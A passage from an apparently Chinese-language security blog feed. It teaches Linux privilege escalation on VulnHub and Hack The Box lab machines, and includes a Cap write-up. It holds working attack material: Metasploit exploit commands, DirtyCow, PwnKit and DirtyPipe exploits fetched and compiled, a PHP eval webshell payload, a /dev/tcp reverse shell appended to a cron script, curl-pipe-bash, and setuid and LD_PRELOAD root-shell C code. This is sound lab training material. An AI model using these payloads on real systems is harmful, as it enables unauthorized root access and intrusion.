class="hljs-regexp">/rebootuser/</span>LinEnum<br></code></pre></td></tr></table></figure><ul><li><p><strong>MSF</strong></p><p>  MSF（Metasploit Framework） 是一款非常流行的开源渗透测试框架，提供了大量的工具和模块，用于发现漏洞、开发攻击载荷（payload）、漏洞利用（exploit）、后渗透攻击等，是网络安全领域的强大工具。</p></li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">//基础命令：<br>msfconsole  <span class="hljs-comment"># 进入框架</span><br>search  ms17_010                                  <span class="hljs-comment"># 查找相关漏洞</span><br>use exploit/windows/smb/ms17_010_eternalblue      <span class="hljs-comment"># 进入模块</span><br>info       <span class="hljs-comment"># 查看模块信息</span><br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp   <span class="hljs-comment"># 设置攻击载荷</span><br>show options          <span class="hljs-comment"># 查看模块需要配置的参数</span><br><span class="hljs-built_in">set</span>  RHOST  192.168.100.158      <span class="hljs-comment"># 设置参数</span><br>exploit / run       <span class="hljs-comment"># 攻击</span><br></code></pre></td></tr></table></figure><h3 id="实例演示-dirtycow-CVE-2016-5159"><a href="#实例演示-dirtycow-CVE-2016-5159" class="headerlink" title="实例演示 - dirtycow(CVE-2016-5159)"></a>实例演示 - dirtycow(CVE-2016-5159)</h3><p><a href="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></p><ul><li><strong>信息收集</strong></li></ul><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p- -sV <span class="hljs-number">192.168.46.0</span>/<span class="hljs-number">24</span>   <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241224145037.png"></p><p>先用浏览器访问 <a href="http://192.168.46.136/">http://192.168.46.136</a> ，没发现有用信息：<br><img src="/../images/Pasted%20image%2020241224145231.png"><br>然后访问 1898 端口：<br><img src="/../images/Pasted%20image%2020241224150213.png"></p><p>通过搜索，得知该 CMS 目前有被公开的漏洞，接下来就是漏洞利用阶段。</p><p>其它环境如果没有明显信息，要想到用 Wappalyzer 搜集信息。</p><ul><li><strong>Web漏洞利用-MSF对CMS已公开漏洞的利用</strong></li></ul><ol><li>输入命令<code>msfconsole</code> ，打开msf框架。</li><li>输入<code>search drupal</code> 搜索相关漏洞：</li></ol><p><img src="/../images/Pasted%20image%2020241224152019.png"></p><p>发现个可以利用的漏洞：Drupalgeddon 2 通过 Forms API 属性注入漏洞，攻击者可以在无需身份验证的情况下，直接远程执行任意代码。</p><ol start="3"><li>使用该漏洞利用模块：</li></ol><figure class="highlight gauss"><table><tr><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">use</span> exploit/unix/webapp/drupal_drupalgeddon2<br><span class="hljs-keyword">show</span> options  <span class="hljs-meta">#查看 payload 需要配置的信息</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241224153345.png"></p><p>设置目标 ip 地址及端口：</p><figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> rhost <span class="hljs-comment">192.168.46.136</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rport 1898</span><br>run<br></code></pre></td></tr></table></figure><p>成功获得 Web 权限：</p><p><img src="/../images/Pasted%20image%2020241224153953.png"></p><ol start="4"><li>升级临时shell：</li></ol><p>首先输入<code>shell</code>起一个终端，然后利用 htb 靶场用过的升级shell的命令：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">SHELL</span>=/bin/bash<span class="hljs-built_in"> script </span>-q /dev/<span class="hljs-literal">null</span><br>stty<span class="hljs-built_in"> raw </span>-echo<br>reset<br>xterm<br></code></pre></td></tr></table></figure><p>或者利用 Python 升级shell：</p><figure class="highlight ada"><table><tr><td class="code"><pre><code class="hljs ada">python -c <span class="hljs-symbol">&#x27;import</span> pty; pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><ul><li><strong>内核提权</strong></li></ul><p><a href="https://www.cnblogs.com/kqdssheng/p/18231011#id4.3">Linux 提权-内核利用 - 扛枪的书生 - 博客园</a></p><p>首先信息收集：</p><p><img src="/../images/Pasted%20image%2020241224161427.png"></p><p>利用提权脚本。这里我们还是使用 htb 靶场用过的 linPEAs 自动查找内核漏洞。</p><p>在 linpeas.sh 所在目录起一个 http.server，方便目标机器下载：</p><p><img src="/../images/Pasted%20image%2020241224155224.png"></p><p>让目标主机获取 linpeas.sh，并将通过管道传输到 bash 直接执行它：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> http://192.168.46.131:8000/linpeas.sh | bash<br></code></pre></td></tr></table></figure><p>检测到目标主机极易受到脏牛漏洞的攻击，并且给出了 exp 的下载地址（exp要多找多试，每个人写的功能不一样，这里给出的就不合适）：</p><p><img src="/../images/Pasted%20image%2020241224160612.png"></p><p>用这个exp : <a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a> ，它将强制修改 root 密码为 “dirtyCowFun” 。</p><p>相同操作让目标主机获取 dcow.cpp:</p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">wget http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.46.131:8000/dcow.cpp</span><br></code></pre></td></tr></table></figure><p>编译：</p><figure class="highlight brainfuck"><table><tr><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">g</span><span class="hljs-literal">++</span> <span class="hljs-literal">-</span><span class="hljs-comment">Wall</span> <span class="hljs-literal">-</span><span class="hljs-comment">pedantic</span> <span class="hljs-literal">-</span><span class="hljs-comment">O2</span> <span class="hljs-literal">-</span><span class="hljs-comment">std=c</span><span class="hljs-literal">++</span><span class="hljs-comment">11</span> <span class="hljs-literal">-</span><span class="hljs-comment">pthread</span> <span class="hljs-literal">-</span><span class="hljs-comment">o dcow dcow</span><span class="hljs-string">.</span><span class="hljs-comment">cpp</span> <span class="hljs-literal">-</span><span class="hljs-comment">lutil</span><br><span class="hljs-comment">//实战中如果在目标服务器上编译失败，可能是对方服务器没有g</span><span class="hljs-literal">++</span><span class="hljs-comment">环境，可以本地找个差不多的系统环境编译好后再上传上去。但是优先在目标服务器上进行编译</span><br></code></pre></td></tr></table></figure><p>执行生成的可执行文件：</p><p><img src="/../images/Pasted%20image%2020241224171505.png"></p><p>提权成功：</p><p><img src="/../images/Pasted%20image%2020241224171636.png"></p><h3 id="实例演示-Pwnkit-CVE-2021-4034"><a href="#实例演示-Pwnkit-CVE-2021-4034" class="headerlink" title="实例演示 - Pwnkit(CVE-2021-4034)"></a>实例演示 - Pwnkit(CVE-2021-4034)</h3><p><a href="https://www.vulnhub.com/entry/darkhole-1,724/">https://www.vulnhub.com/entry/darkhole-1,724/</a></p><ul><li><strong>信息收集</strong></li></ul><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sC <span class="hljs-number">192.168.46.0</span>/<span class="hljs-number">24</span>   <br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241224183816.png"></p><ul><li><strong>Web 漏洞利用-逻辑漏洞及文件上传漏洞</strong></li></ul><p>访问 <a href="http://192.168.46.137/">http://192.168.46.137</a> ，注册个账号，登录：</p><p><img src="/../images/Pasted%20image%2020241224184429.png"></p><p>提供的是修改密码的功能，url 处有个 get 参数 id&#x3D;2，将其修改为 1 试试：</p><p><img src="/../images/Pasted%20image%2020241224184708.png"></p><p>抓个包，看到两个 post 参数：</p><p><img src="/../images/Pasted%20image%2020241224190044.png"></p><p>那么把 id 改为1是不是就能修改管理员密码了？</p><p>成功登录管理员账号：</p><p><img src="/../images/Pasted%20image%2020241224190507.png"></p><p>接下来就是考察文件上传漏洞了。</p><p>后端语言是 PHP：</p><p><img src="/../images/Pasted%20image%2020241224190754.png"></p><p>哥斯拉生成个shell： </p><p><img src="/../images/Pasted%20image%2020241224191321.png"></p><p>有黑名单限制，fuzz 之后发现可以将后缀名改为 phtml 绕过。</p><p>连接后门：</p><p><img src="/../images/Pasted%20image%2020241224201548.png"></p><p>虽然哥斯拉有命令执行功能，可以直接上传脚本，但是执行后的响应不太好看。最好还是利用哥斯拉的PMeterpreter 模块反弹 shell 到 msf：</p><p><img src="/../images/Pasted%20image%2020241224203850.png"></p><p>反弹成功：</p><p><img src="/../images/Pasted%20image%2020241224203953.png"></p><ul><li><strong>内核提权</strong></li></ul><p>步骤和上一个实例相同，详细文字就不写了，直接放图片：</p><p><img src="/../images/Pasted%20image%2020241224205334.png"></p><figure class="highlight subunit"><table><tr><td class="code"><pre><code class="hljs subunit">wget http://192.168.46.131:8000/CVE<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>-main.zip <br>unzip CVE<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>-main.zip <br>make<br>./cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span><br></code></pre></td></tr></table></figure><p>但是进行到一步的时候，发现目标系统没有这个工具，安装又需要 root 权限，只能换个 exp：<br><a href="https://github.com/arthepsy/CVE-2021-4034">https://github.com/arthepsy/CVE-2021-4034</a></p><figure class="highlight subunit"><table><tr><td class="code"><pre><code class="hljs subunit">wget http://192.168.46.131:8000/cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>-poc.c <br>gcc cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>-poc.c -o cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>-poc<br>./cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>-poc<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241224214627.png"></p><h3 id="实例演示-DirtyPipe-CVE-2022-0847"><a href="#实例演示-DirtyPipe-CVE-2022-0847" class="headerlink" title="实例演示 - DirtyPipe(CVE-2022-0847)"></a>实例演示 - DirtyPipe(CVE-2022-0847)</h3><p><a href="https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/">https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/</a></p><ul><li><strong>信息收集</strong></li></ul><p><img src="/../images/Pasted%20image%2020241224215602.png"></p><ul><li><strong>Web漏洞利用-敏感文件和后门</strong></li></ul><p><img src="/../images/Pasted%20image%2020241224215732.png"><br>扫目录看看有没有敏感文件：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gobuster</span> dir -u http://<span class="hljs-number">192.168.139.138</span> -x php,bak,txt,html -w /usr/share/dirbuster/wordlists/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-medium.txt<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241224221401.png"></p><p><img src="/../images/Pasted%20image%2020241224221341.png"></p><p>找到个能操作的页面：</p><p><img src="/../images/Pasted%20image%2020241224221534.png"></p><p>抓包分析一下：</p><p><img src="/../images/Pasted%20image%2020241224222116.png"></p><p>输入的内容被写进 txt 文件里了：</p><p><img src="/../images/Pasted%20image%2020241224223413.png"></p><p>那么可以把这两个参数改成木马和后门文件：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">message=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>]);<span class="hljs-meta">?&gt;</span>&amp;file=shell.php<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241224225818.png"></p><p><img src="/../images/Pasted%20image%2020241224225751.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">wget http://192.168.46.131:8000/dirtypipez.c <br>gcc dirtypipez.c -o dirtypipez<br>./dirtypipez<br></code></pre></td></tr></table></figure><p>提示 <code>Usage: ./dirtypipez SUID</code></p><p>常见的 SUID 文件包括 <code>/bin/su</code> 或 <code>/usr/bin/passwd</code>，这些是提权的潜在目标。</p><p><img src="/../images/Pasted%20image%2020241224230639.png"></p><h2 id="2-根据-Linux-特性提权"><a href="#2-根据-Linux-特性提权" class="headerlink" title="2. 根据 Linux 特性提权"></a>2. 根据 Linux 特性提权</h2><h3 id="SUID-SUDO"><a href="#SUID-SUDO" class="headerlink" title="SUID&amp;SUDO"></a>SUID&amp;SUDO</h3><p>SUID 是一种文件权限设置。用户在执行程序&#x2F;文件&#x2F;命令的时候，将获取文件所有者的权限以及所有者的UID和GID。之前的 HTB-Oopsie 靶场就是利用 SUID 特性提权。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span>  # 查找拥有 SUID 权限的文件<br></code></pre></td></tr></table></figure><p>SUDO 权限是 root 把本来只能超级用户执行的命令赋予普通用户执行。SUDO有两个CVE漏洞（CVE-2019-14287，CVE-2021-3156）。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/sudoers    <span class="hljs-comment"># 查看哪些用户或用户组可以使用 sudo 命令</span><br><span class="hljs-built_in">sudo</span> -l             <span class="hljs-comment"># 列出当前用户在使用 sudo 时的权限。</span><br></code></pre></td></tr></table></figure><p>通俗来讲就是当 root 用户赋予一个文件 SUID、SUDO 权限时，这个文件被调用的时候就会享有 root 权限。具体如何利用可以在这个项目里查找对应二进制文件的命令： <a href="https://gtfobins.github.io/">GTFOBins</a>。例如利用 find 提权：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/usr/bin/find . -<span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span> \;  <br></code></pre></td></tr></table></figure><h3 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h3><p>NFS是一种网络文件共享协议，用于访问远程服务器中的共享资源，默认端口 2049，原生支持类 UNIX&#x2F;Linux 系统。前面 HTB 靶场遇到过 SMB 协议，也是网络文件共享协议，默认端口 445，原生支持 Windows 系统。</p><figure class="highlight elixir"><table><tr><td class="code"><pre><code class="hljs elixir">showmount -e <span class="hljs-number">192.168</span>.<span class="hljs-number">1.6</span>   <span class="hljs-comment"># 显示 NFS 服务器的共享信息</span><br>mkdir nfs                  <span class="hljs-comment"># 本地创建一个 nfs 目录</span><br>mount -t nfs <span class="hljs-number">192.168</span>.<span class="hljs-number">1.6</span><span class="hljs-symbol">:/mnt/nfs</span> ./nfs  <span class="hljs-comment"># 把目标的 /mnt/nfs 目录跟本地的 nfs 目录进行同步</span><br></code></pre></td></tr></table></figure><p>既然文件能够同步，那么就可以配合 SUID 提权，例如把本地具有 SUID 权限的 find 上传到共享目录：</p><p><img src="/../images/Pasted%20image%2020241225203036.png"></p><p>但如果双方系统不同，则会报错。解决办法是找一个与目标版本相似的系统，上传这个系统的find，或者自己写一个c语言去调用命令：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// getroot.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>); <span class="hljs-meta"># root用户：UID为0，系统用户：UID(0-999)，普通用户：UID(1000-*) </span><br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;id&quot;</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//把getroot.c编译为getroot可执行文件</span><br>gcc getroot.c -o getroot<br></code></pre></td></tr></table></figure><h3 id="PATH-变量"><a href="#PATH-变量" class="headerlink" title="PATH 变量"></a>PATH 变量</h3><p> 参考 HTB-Oopsie 靶场。在执行具有 SUID 权限的&#x2F;usr&#x2F;bin&#x2F;bugtracker 时，发现它会使用 cat 命令，于是插入我们自己构造的 cat 命令，赋予执行权限并将其添加到环境变量中，这样 cat 命令就会以 root 身份执行。</p><p>下例相同：</p><p><code>strings</code>查看具有 SUID 权限的二进制文件，发现里面有 curl 命令。于是在 &#x2F;tmp 下新建一个 curl 文件，执行 <code>/bin/sh</code>:</p><p><img src="/../images/Pasted%20image%2020241225210244.png"></p><p><img src="/../images/Pasted%20image%2020241225210331.png"></p><h3 id="Cron-计划任务"><a href="#Cron-计划任务" class="headerlink" title="Cron 计划任务"></a>Cron 计划任务</h3><p>Cron 是 Linux 系统中用于定期执行任务的守护进程。</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>crontab <span class="hljs-regexp">//</span>查看当前服务器的计划任务<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241225211150.png"></p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">ls</span> -l <span class="hljs-string">/etc/script/CleaningScript.sh</span>  <span class="hljs-string">//</span>查看对该任务文件的权限<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241225211334.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.139.141/66 0&gt;&amp;1&quot;</span> &gt;&gt; /etc/script/CleaningScript.sh   <span class="hljs-comment"># 把反弹shell命令写进这个文件里</span><br><br><span class="hljs-built_in">cat</span> /etc/script/CleaningScript.sh   <span class="hljs-comment"># 查看脚本内容</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241225211447.png"></p><p><img src="/../images/Pasted%20image%2020241225211502.png"></p><h3 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h3><p>在 Linux 中，传统的权限管理是基于用户和组的（例如，root用户拥有所有权限），而 Capabilities 机制的引入，将权限分解为多个独立的“能力”，每个能力代表操作系统中特定的权限。每个进程拥有一组“能力”，这些能力决定了它能够执行的操作，而无需赋予进程 root 用户的所有权限。</p><p>当拿到权限后要先看下有哪些程序有能力，再对这些能力进行筛选利用。在之前的 HTB-Cap 靶场中，<code>/usr/bin/python3.8</code> 拥有 <code>cap_setuid</code> 权限，因此可以切换到 root 身份。</p><blockquote><p>[!NOTE] cap_setuid</p><ul><li>文件 cap_setuid 的 capabilities 和文件的 suid 标志位之间是没有关系的。</li><li>设置了 cap_setuid 的 capability 的文件并没有设置 suid。</li><li>设置了 suid 的程序也不拥有 cap_setuid 的 capability。</li></ul></blockquote><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">getcap -r / <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span>   <span class="hljs-comment">//查看所有Capabilities</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241225220832.png"></p><p><img src="/../images/Pasted%20image%2020241225221004.png"></p><p><img src="/../images/Pasted%20image%2020241225220935.png"></p><p><img src="/../images/Pasted%20image%2020241225221043.png"></p><h3 id="LD-Preload"><a href="#LD-Preload" class="headerlink" title="LD_Preload"></a>LD_Preload</h3><p>LD_Preload 是 Linux 系统中的一个环境变量，它允许用户在运行一个程序时，指定额外的共享库（动态链接库）。这些共享库会在程序启动时首先被加载，并覆盖程序原本需要使用的库。</p><p>利用 LD_Preload 在程序运行前优先加载攻击者自定义的so文件，从而达到提权效果。</p><p>打开<code>/etc/sudoers</code>文件：</p><figure class="highlight subunit"><table><tr><td class="code"><pre><code class="hljs subunit">Defaults        env_keep += LD_PRELOAD       # 设置开启LD_PRELOAD<br><span class="hljs-keyword">test  </span>ALL=(ALL:ALL) NOPASSWD: /usr/bin/find  # 赋予一个用户一些sudo权限<br></code></pre></td></tr></table></figure><p>一旦这样设置就会有两个安全问题：sudo提权和 LD_Preload 提权。</p><p>在&#x2F;tmp目录中生成一个 shell.c：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> _init() &#123;<br><span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br><span class="hljs-built_in">setgid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">gcc -fPIC -shared -<span class="hljs-keyword">o</span> <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">so</span> <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">c</span> -nostartfiles  //编译这个<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">c</span>文件为<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">so</span>文件<br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">al</span> <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">so</span><br>sudo LD_PRELOAD=/tmp/<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">so</span> <span class="hljs-keyword">find</span> //让<span class="hljs-keyword">find</span>在执行的时候绑定编译好的<span class="hljs-keyword">so</span>文件<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241225222532.png"></p><p>类似于 Windows dll劫持，linux是执行so文件，Windows是执行dll文件。</p><h1 id="Windows权限提升"><a href="#Windows权限提升" class="headerlink" title="Windows权限提升"></a>Windows权限提升</h1><h2 id="工具提权"><a href="#工具提权" class="headerlink" title="工具提权"></a>工具提权</h2><p>MSF、CS</p><p><a href="https://www.freebuf.com/articles/web/396553.html">windows权限提升-WIN提权 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.csdn.net/m0_60571842/article/details/136953674">权限提升-Windows权限提升篇&amp;溢出漏洞&amp;宝塔面板Bypass&amp;CS插件化&amp;MSF模块化_windows权限提升-溢出漏洞-宝塔面板-bypass-cs插件化-msf模块化-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_74402888/article/details/144075435">DAY136权限提升-Win系统权限提升篇&amp;计算机管理用户&amp;进程注入&amp;令牌窃取&amp;服务启动&amp;远程控制-CSDN博客</a></p><h2 id="人工提权"><a href="#人工提权" class="headerlink" title="人工提权"></a>人工提权</h2><p>优点：解决工具或插件无法实时更新的EXP。<br>缺点：操作繁琐，需要各种复现调试。</p><p><a href="https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w">【内网攻防】权限提升-土豆提权大汇总</a></p><p><a href="https://blog.csdn.net/m0_60571842/article/details/136974781">权限提升-Windows权限提升篇&amp;溢出漏洞&amp;土豆家族&amp;通杀全系&amp;补丁对比&amp;EXP筛选_土豆系列提权-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux权限提升&quot;&gt;&lt;a href=&quot;#Linux权限提升&quot; class=&quot;headerlink&quot; title=&quot;Linux权限提升&quot;&gt;&lt;/a&gt;Linux权限提升&lt;/h1&gt;&lt;h2 id=&quot;1-内核提权&quot;&gt;&lt;a href=&quot;#1-内核提权&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="红队技能" scheme="http://example.com/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/"/>
    
  </entry>
  
  <entry>
    <title>Hack-The-Box-Cap</title>
    <link href="http://example.com/2024/12/21/Hack-The-Box-Cap/"/>
    <id>http://example.com/2024/12/21/Hack-The-Box-Cap/</id>
    <published>2024-12-21T07:05:22.000Z</published>
    <updated>2024-12-21T11:08:28.298Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>通过这篇博客，你会了解到 IDOR、FTP协议的安全隐患、linPEAS 的使用、cap_setuid权限。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><h1 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h1><p> 首先 nmap 扫描目标主机端口：</p><p><img src="/../images/Pasted%20image%2020241221151154.png"></p><p>先从ftp入手，尝试匿名登录，失败了:</p><p><img src="/../images/Pasted%20image%2020241221151437.png"></p><p>然后从 http 入手，浏览器访问 <a href="http://10.10.10.245/">http://10.10.10.245</a>:</p><p><img src="/../images/Pasted%20image%2020241221152001.png"></p><p>点击 Security Snapshot：</p><p><img src="/../images/Pasted%20image%2020241221172050.png"></p><p>然后点击下载后，下载了一个 1.pcap。这是一个数据包捕获文件，可以用 Wireshark 打开：</p><p><img src="/../images/Pasted%20image%2020241221153106.png"></p><p>可以看出来这捕获的是我们本机的 HTTP 流量，并没有什么用。</p><p>回头看地址栏，发现形式是<code>/data/id</code>，于是猜测将id改为0，会不会看到之前的数据包。此漏洞称为不安全直接对象引用 （Insecure Direct Object Reference，IDOR），用户可以直接访问其他用户拥有的数据。</p><p>成功下载 0.pacp，发现了两条敏感数据： </p><p><img src="/../images/Pasted%20image%2020241221153543.png"></p><p>FTP 流量中包括了用户身份验证。注意 FTP 协议本身存在安全隐患，因为它传输的用户名和密码是明文的，建议使用加密的传输协议（如 FTPS 或 SFTP）来确保数据安全性。于是利用 ssh 远程登录：</p><p><img src="/../images/Pasted%20image%2020241221154009.png"></p><p><img src="/../images/Pasted%20image%2020241221154023.png"></p><p>找到 user flag:<br><img src="/../images/Pasted%20image%2020241221154929.png"></p><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>之前我们在 Archetype 机器上利用<a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe">winPEAS</a>，搜索在 Windows 主机上提升权限的可能路径。对于Linux 操作系统，我们使用 <a href="https://github.com/peass-ng/PEASS-ng/releases/download/20241205-c8c0c3e5/linpeas.sh">linPEAS</a>查找提升权限的可能路径。 </p><p>在 linpeas.sh 所在目录启动一个 http.server:</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8000</span> <br></code></pre></td></tr></table></figure><p>让目标主机获取 linpeas.sh，并将通过管道传输到 bash 直接执行它：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> http://10.10.16.18:8000/linpeas.sh | bash<br></code></pre></td></tr></table></figure><p>发现一条重要信息：</p><p><img src="/../images/Pasted%20image%2020241221183706.png"></p><p>发现了在 Oopsie 机器遇到过的 SUID。<code>/usr/bin/python3.8</code> 拥有 <code>cap_setuid</code> 权限，它允许进程在没有设置 SUID 位的情况下切换用户身份到任意 UID。利用这个配置，我们可以切换到 UID 0（即 root）。</p><p>打开 Python 进程，输入以下命令：</p><figure class="highlight moonscript"><table><tr><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">import</span> <span class="hljs-built_in">os</span> <br><span class="hljs-built_in">os</span>.setuid(<span class="hljs-number">0</span>) <br><span class="hljs-built_in">os</span>.system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241221185733.png"></p><p>成功获取 root 权限：</p><p><img src="/../images/Pasted%20image%2020241221185834.png"></p><p>root flag：</p><p><img src="/../images/Pasted%20image%2020241221190006.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>前面几篇都是 Starting Point 的机器，从这篇开始做 Machines，没想到第一个比以前做过的都简单。多刷，思路就越来越清晰了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;通过这篇博客，你会了解到 IDOR、FTP协议的安全隐患、l</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack-The-Box-Unified</title>
    <link href="http://example.com/2024/12/20/Hack-The-Bdox-Unified/"/>
    <id>http://example.com/2024/12/20/Hack-The-Bdox-Unified/</id>
    <published>2024-12-20T09:47:14.000Z</published>
    <updated>2024-12-21T06:37:14.699Z</updated>
    
